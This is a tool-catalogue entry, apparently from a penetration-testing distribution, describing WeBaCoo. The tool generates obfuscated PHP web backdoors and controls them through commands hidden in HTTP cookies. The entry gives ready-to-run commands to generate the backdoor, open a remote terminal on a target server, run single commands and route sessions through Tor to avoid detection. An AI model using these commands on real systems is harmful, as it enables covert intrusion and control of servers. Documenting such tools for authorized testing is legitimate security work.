---
name: "webacoo"
categories:
  - blackarch-backdoor
version: "0.2.3"
homepage: "https://bechtsoudis.com/webacoo/"
packaged-by: [blackarch, kali]
blackarch-builddate: "2025-07-18"
build-system: perl
license: GPL3
meta-checked: "2026-11-09"
github-repo: "anestisb/WeBaCoo"
github-stars: 186
github-pushed: "2012-03-11"
github-archived: false
github-issues: 1
github-match: "search"
gh-checked: "2026-11-07"
worth: 2.7
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# webacoo

> Web Backdoor Cookie Script-Kit — generates obfuscated PHP backdoors that tunnel command output inside HTTP Cookie headers, plus the client that drives them as a pseudo-terminal.

*No corpus evidence — derived from upstream documentation.*

## What it's for

WeBaCoo (Web Backdoor Cookie, by Anestis Bechtsoudis, Perl, 2011-2012) has two halves. The generator emits a single obfuscated PHP script that executes commands through your choice of PHP function — `system` (default), `shell_exec`, `exec`, `passthru` or `popen`. Once that file sits on a web host, the client talks to it over ordinary HTTP GET/POST requests whose command output is smuggled back inside a cookie value (default cookie name "M-cookie", with a random delimiter per request), so the traffic looks like any other browsing session in access logs. The client offers a "terminal" mode, single-command mode, proxy chaining including Tor, per-request verbosity and activity logging, and since 0.2.1 extension modules loadable inside the terminal: `mysql-cli`, `psql-cli`, `upload`, `download`, and `stealth` (`.htaccess` handling). Needs `liburi-perl`; `libio-socket-socks-perl` is only required for the Tor/proxy feature (or comment line 25 of `webacoo.pl`). What it does not do: there is no persistence or privilege-escalation logic — it is purely the channel.

## Typical use cases

### Generate the backdoor

```
./webacoo.pl -g -o backdoor.php
```

Outcome: writes `backdoor.php` — an obfuscated one-file backdoor using `system()` with the default cookie protocol baked in. Deploy it on a PHP host you are authorized to test, then point the client at its URL.

### Generate a readable variant with a different exec function

```
./webacoo.pl -g -o raw-backdoor.php -f 4 -r
```

Outcome: writes an un-obfuscated backdoor (`-r`) that runs commands through `passthru` (`-f 4`) — useful for reviewing exactly what will sit on the server or for swapping in the function a hardened host still allows.

### Open a pseudo-terminal over cookies

```
./webacoo.pl -t -u http://target.example.com/backdoor.php
```

Outcome: a `webacoo>` prompt where each command is executed on the server and its output returned inside the cookie of the response. Type `load` to list and activate extension modules (mysql-cli, upload, download, stealth…) and `unload` to return to the plain terminal.

### Run a single command

```
./webacoo.pl -t -u http://target.example.com/backdoor.php -e "uname -a"
```

Outcome: executes the one command through the deployed backdoor, prints the output and exits — scriptable for scheduled checks. `-c`/`-d` let you match a non-default cookie name or delimiter.

### Route through Tor or a proxy and keep a log

```
./webacoo.pl -t -u http://example.com/backdoor.php -p tor -l webacoo_log.txt
```

Outcome: the terminal session exits through the local Tor SOCKS proxy (alternatively `-p 127.0.0.1:8080` or `-p user:pass:ip:port` for an authenticating proxy) while every command and response is appended to `webacoo_log.txt`.
